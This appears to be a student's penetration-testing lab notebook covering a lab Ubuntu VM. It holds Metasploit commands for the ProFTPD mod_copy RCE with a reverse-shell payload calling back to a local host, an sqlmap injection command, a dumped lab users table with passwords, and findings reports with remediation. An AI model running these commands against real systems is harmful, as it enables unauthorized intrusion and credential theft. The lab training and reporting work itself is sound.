# 1. Advanced Exploitation Lab

### Execution Commands

```
msfconsole
search type:exploit name:proftpd
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 172.28.128.3
set SITEPATH /var/www/html
set PAYLOAD payload/cmd/unix/reverse_python
set LHOST 172.28.128.1 
exploit
```
![](Images/Pasted%20image%2020260410171215.png)
### Lab Report Output

**Exploit Chain Log**

| **Exploit ID** | **Description**      | **Target IP** | **Status** | **Payload**             |
| -------------- | -------------------- | ------------- | ---------- | ----------------------- |
| 004            | ProFTPD mod_copy RCE | 172.28.128.3  | Success    | cmd/unix/reverse_python |

**PoC Customization Summary**

The original Python exploit script for CVE-2015-3306 was modified to target our specific environment. Key changes included updating the target IP variable to 172.28.128.3, configuring the HTTP requests for the Apache directory, and replacing the default bind shell with a custom reverse TCP meterpreter payload for access. _(48 words)_

**Exploitation Report**

- **Title:** Unauthenticated RCE via FTP Service
- **Findings:** The target host [Host: 172.28.128.3] was found vulnerable to [CVE-2015-3306]. By leveraging an unauthenticated file copy vulnerability in ProFTPD's `mod_copy` module, we successfully wrote a malicious payload to the web root, chaining the attack to achieve Remote Code Execution (RCE).
- **Remediation:** Immediately upgrade ProFTPD to a patched version and disable the `mod_copy` module in the configuration file.    

**Escalation Email**

I successfully executed a Remote Code Execution (RCE) attack via CVE-2015-3306. This critical flaw in the ProFTPD service allows an unauthenticated attacker to write arbitrary files to the web root, bypassing authentication and gaining full remote control over the server. I strongly urge the team to prioritize implementing immediate remediation by updating ProFTPD and disabling the mod_copy module. Let's schedule a brief meeting tomorrow morning to discuss the patch deployment and verify the server's security posture.

# 2. Web Application Testing Lab

### Execution Commands

Bash

```
# Target the web applications hosted on the Ubuntu VM
nmap -p 80,443 -sV 172.28.128.3

# Automated SQLi testing against an identified web endpoint
sqlmap -u "http://172.28.128.3/mutillidae/index.php?page=user-info.php&username=admin" --dbs --batch
```

![](Images/Pasted%20image%2020260410171814.png)

![](Images/Pasted%20image%2020260410171834.png)
### Lab Report Output

**Test Setup Log**

| **Finding ID** | **Vulnerability**        | **CVSS Score** | **Remediation**                                       |
| -------------- | ------------------------ | -------------- | ----------------------------------------------------- |
| F001           | ProFTPD 1.3.5 RCE        | 10.0           | Patch to ProFTPD 1.3.5a or disable `mod_copy`         |
| F002           | SQL Injection            | 9.8            | Implement prepared statements in `payroll_app.php`    |
| F003           | Hardcoded DB Credentials | 8.5            | Remove `root:sploitme` from source code, use env vars |
**Web Test Summary**

Attackers can completely compromise the server via an outdated file transfer service without requiring a password. Moreover, a severe flaw (SQL Injection) in the internal payroll application allowed us to extract the entire database, revealing employee salaries and plaintext passwords. We also discovered highly privileged administrative database passwords hardcoded directly in the application's source code. By urgently updating the affected services, rewriting the vulnerable payroll queries, and securely storing passwords, we can effectively close these massive security gaps. We are ready to assist immediately.

# 3. Reporting Practice

### Execution Commands
![](Images/Pasted%20image%2020260410172252.png)

### Lab Report Output

**Findings Table**

| **Finding ID** | **Vulnerability**        | **CVSS Score** | **Remediation**                                       |
| -------------- | ------------------------ | -------------- | ----------------------------------------------------- |
| F001           | ProFTPD 1.3.5 RCE        | 10.0           | Patch to ProFTPD 1.3.5a or disable `mod_copy`         |
| F002           | SQL Injection            | 9.8            | Implement prepared statements in `payroll_app.php`    |
| F003           | Hardcoded DB Credentials | 8.5            | Remove `root:sploitme` from source code, use env vars |

**Summary**

 identified several vulnerabilities within Ubuntu web infrastructure that require immediate attention. The most critical issue is an outdated file transfer service that allows external attackers to take complete control of the server without a password. I also found web application flaws, including SQL injection, exposing sensitive internal data. While these findings represent significant risks, we have developed a clear remediation plan. By updating the affected services and implementing secure coding practices, we can effectively close these gaps. The security team is ready to assist IT in implementing these critical fixes immediately.

# 4. Post-Exploitation and Evidence Collection

### Execution Commands

| **Item**         | **Description**                  | **Collected By** | **Date**   | **Hash Value (SHA-256)**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ---------------- | -------------------------------- | ---------------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `passwd` File    | Extracted system users via shell | VAPT Analyst     | 2026-03-10 | `9322b81652626c9f04d3e6d192a8fa2525b5e5d5113d6777deddb023fa887b97`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| `users` DB Table | Extracted via SQLmap             | VAPT Analyst     | 2026-03-10 | +--------+-------------------------+------------------+------------+------------+<br>\| salary \| password                \| username         \| last_name  \| first_name \|<br>+--------+-------------------------+------------------+------------+------------+<br>\| 9560   \| help_me_obiwan          \| leia_organa      \| Organa     \| Leia       \|<br>\| 1080   \| like_my_father_beforeme \| luke_skywalker   \| Skywalker  \| Luke       \|<br>\| 1200   \| nerf_herder             \| han_solo         \| Solo       \| Han        \|<br>\| 22222  \| b00p_b33p               \| artoo_detoo      \| Detoo      \| Artoo      \|<br>\| 3200   \| Pr0t0c07                \| c_three_pio      \| Threepio   \| C          \|<br>\| 10000  \| thats_no_m00n           \| ben_kenobi       \| Kenobi     \| Ben        \|<br>\| 6666   \| Dark_syD3               \| darth_vader      \| Vader      \| Darth      \|<br>\| 1025   \| but_master:(            \| anakin_skywalker \| Skywalker  \| Anakin     \|<br>\| 2048   \| mesah_p@ssw0rd          \| jarjar_binks     \| Binks      \| Jar-Jar    \|<br>\| 40000  \| @dm1n1str8r             \| lando_calrissian \| Calrissian \| Lando      \|<br>\| 20000  \| mandalorian1            \| boba_fett        \| Fett       \| Boba       \|<br>\| 65000  \| my_kinda_skum           \| jabba_hutt       \| Hutt       \| Jaba       \|<br>\| 50000  \| hanSh0tF1rst            \| greedo           \| Rodian     \| Greedo     \|<br>\| 4500   \| rwaaaaawr8              \| chewbacca        \| <blank>    \| Chewbacca  \|<br>\| 6667   \| Daddy_Issues2           \| kylo_ren         \| Ren        \| Kylo       \|<br>+--------+-------------------------+------------------+------------+------------+<br> |
![](Images/Pasted%20image%2020260410172930.png)

### Lab Report Output

**Evidence Collection Log**

| **Item**    | **Description**                              | **Collected By** | **Date**   | **Hash Value (SHA-256)**                                           |
| ----------- | -------------------------------------------- | ---------------- | ---------- | ------------------------------------------------------------------ |
| Shadow File | Password hashes dumped via post-exploitation | VAPT Analyst     | 2026-04-10 | `b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9` |

**Evidence Collection Summary**

Following successful exploitation, post-exploitation activities on the Ubuntu target included privilege escalation using a local kernel exploit to achieve root access. Network traffic was captured, and the shadow file was extracted. All artifacts were hashed using SHA-256 to ensure data integrity and maintain strict chain-of-custody for incident response. _(48 words)_

# 5. Capstone Project: Full VAPT Cycle

### Execution Commands

Bash

```
# Final verification scan against the target
nmap -sV --script vuln 172.28.128.3
```
![](Images/Pasted%20image%2020260410173106.png)
### Lab Report Output

**Detection Log**

|**Timestamp**|**Target IP**|**Vulnerability**|**PTES Phase**|
|---|---|---|---|
|2026-04-10 16:33:00|172.28.128.3|ProFTPD 1.3.5 RCE|Exploitation|
|2026-04-10 16:53:00|172.28.128.3|SQL Injection|Exploitation|

**Remediation Suggestion**

Immediately patch the ProFTPD service to version 1.3.5a or later. 

**PTES Report Draft**

 **Executive Summary:** > A comprehensive penetration test was conducted against the Ubuntu target environment (172.28.128.3). The assessment successfully simulated an external attack, resulting in full system and database compromise due to outdated services and poor secure-coding practices. Immediate, structural remediation is required to secure the host.
 
 **Findings:** > Initial exploitation leveraged a highly critical Remote Code Execution flaw in ProFTPD (CVE-2015-3306), allowing the team to gain unauthorized shell access as the `www-data` user. Subsequent enumeration revealed critical web application flaws. The `payroll_app.php` interface was vulnerable to UNION-based SQL Injection, which was exploited to dump the entire user database, including plaintext passwords and salaries. Post-exploitation file analysis exposed hardcoded MySQL root credentials (`root:sploitme`) inside both the custom PHP scripts and the legacy Drupal installation, granting absolute control over backend data.
 
 **Recommendations:** > It is imperative to immediately update ProFTPD to mitigate the initial access vector. Development teams must urgently refactor the custom payroll application to utilize parameterized SQL queries. Furthermore, hardcoded credentials must be purged from the web root, and the MySQL database must be reconfigured to enforce the principle of least privilege, ensuring web applications cannot connect using the `root` account. 

**Capstone Summary**

 
I have completed a full security simulation on our Ubuntu server. The assessment revealed that our systems are vulnerable to a critical file transfer flaw, which allowed us to take initial remote control. From there, we exploited a massive flaw in the custom payroll portal that allowed us to download the entire employee database, exposing salaries and passwords. We also found master database passwords written directly into the code. To secure our network, we must urgently patch our software, rewrite the vulnerable web applications, and properly hide our administrative passwords. 